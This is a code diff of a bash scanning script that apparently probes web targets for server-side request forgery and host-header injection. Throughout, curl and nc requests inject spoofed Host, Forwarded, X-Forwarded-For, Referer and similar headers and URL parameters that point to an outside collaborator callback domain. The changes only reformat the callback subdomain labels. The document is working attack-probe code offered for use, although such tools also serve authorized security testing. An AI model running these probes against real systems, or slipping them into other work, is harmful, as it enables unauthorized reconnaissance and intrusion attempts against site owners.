@@ -52,7 +52,7 @@ inject_host_header() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
-    curl -H "Host: h-$UD.$Collab"  "$domain" &> /dev/null &
+    curl -H "Host: h--$UD.$Collab"  "$domain" &> /dev/null &
     # Print the processed domain for reference
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
     # Wait for $Delay seconds before next iteration
@@ -81,7 +81,7 @@ inject_common_headers() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the HTTP GET request using curl (background) with additional headers
-    curl -H "From: root@$UD.From.$Collab" -H "User-Agent: Mozilla/5.0 root@$UD.User-Agent.$Collab" -H "Referer: http://$UD.Referer.$Collab/ref" -H "X-Original-URL: http://$UD.X-Original-URL.$Collab/" -H "X-Wap-Profile: http://$UD.X-Wap-Profile.$Collab/wap.xml" -H "Profile: http://$UD.Profile.$Collab/wap.xml" -H "X-Arbitrary: http://$UD.X-Arbitrary.$Collab/" -H "X-HTTP-DestinationURL: http://$UD.X-HTTP-DestinationURL.$Collab/" -H "X-Forwarded-Proto: http://$UD.X-Forwarded-Proto.$Collab/" -H "Origin: http://$UD.Origin.$Collab/" -H "X-Forwarded-Host: $UD.X-Forwarded-Host.$Collab" -H "X-Host: $UD.X-Host.$Collab" -H "Proxy-Host: $UD.Proxy-Host.$Collab" -H "Destination: $UD.Destination.$Collab" -H "Proxy: http://$UD.Proxy.$Collab/" -H "X-Forwarded-For: $UD.X-Forwarded-For.$Collab" -H "Contact: root@$UD.Contact.$Collab" -H "Forwarded: for=spoofed.$UD.Forwardedfor.$Collab;by=spoofed.$UD.Forwardedby.$Collab;host=spoofed.$UD.Forwardedhost.$Collab" -H "X-Client-IP: $UD.X-Client-IP.$Collab" -H "Client-IP: $UD.Client-IP.$Collab" -H "True-Client-IP: $UD.True-Client-IP.$Collab" -H "CF-Connecting_IP: $UD.CF-Connecting-IP.$Collab" -H "X-Originating-IP: $UD.X-Originating-IP.$Collab" -H "X-Real-IP: $UD.X-Real-IP.$Collab" "$domain" &> /dev/null &    
+    curl -H "From: root@From--$UD.$Collab" -H "User-Agent: Mozilla/5.0 root@User-Agent--$UD.$Collab" -H "Referer: http://Referer--$UD.$Collab/ref" -H "X-Original-URL: http://X-Original-URL--$UD.$Collab/" -H "X-Wap-Profile: http://X-Wap-Profile--$UD.$Collab/wap.xml" -H "Profile: http://Profile--$UD.$Collab/wap.xml" -H "X-Arbitrary: http://X-Arbitrary--$UD.$Collab/" -H "X-HTTP-DestinationURL: http://X-HTTP-DestinationURL--$UD.$Collab/" -H "X-Forwarded-Proto: http://X-Forwarded-Proto--$UD.$Collab/" -H "Origin: http://Origin--$UD.$Collab/" -H "X-Forwarded-Host: X-Forwarded-Host--$UD.$Collab" -H "X-Host: X-Host--$UD.$Collab" -H "Proxy-Host: Proxy-Host--$UD.$Collab" -H "Destination: Destination--$UD.$Collab" -H "Proxy: http://Proxy--$UD.$Collab/" -H "X-Forwarded-For: X-Forwarded-For--$UD.$Collab" -H "Contact: root@Contact--$UD.$Collab" -H "Forwarded: for=Forwardedfor--$UD.$Collab;by=Forwardedby--$UD.$Collab;host=Forwardedhost--$UD.$Collab" -H "X-Client-IP: X-Client-IP--$UD.$Collab" -H "Client-IP: Client-IP--$UD.$Collab" -H "True-Client-IP: True-Client-IP--$UD.$Collab" -H "CF-Connecting_IP: CF-Connecting-IP--$UD.$Collab" -H "X-Originating-IP: X-Originating-IP--$UD.$Collab" -H "X-Real-IP: X-Real-IP--$UD.$Collab" "$domain" &> /dev/null &    
     # Print the processed domain for reference
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
     # Wait for $Delay seconds before next iteration
@@ -110,8 +110,8 @@ inject_absolute_url() {
     # Increment the counter
     counter=$((counter + 1))
     # Send the row HTTP GET request using nc (background)
-    echo -e "GET http://a-$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
-    echo -e "GET http://a-$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
+    echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $UD\r\n" | nc -q 1 $UD 80  &> /dev/null &
+    echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $UD\r\n" | nc -q 1 $UD 443 &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
@@ -180,7 +180,7 @@ inject_url_parameters() {
     current_time=$(date +"%H:%M:%S")
     p=$((p + 1))
     # Construct new URL with the parameter injected
-    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$UD.p.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
+    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
     # Send the request
     curl -L "$new_url" &> /dev/null &
     echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
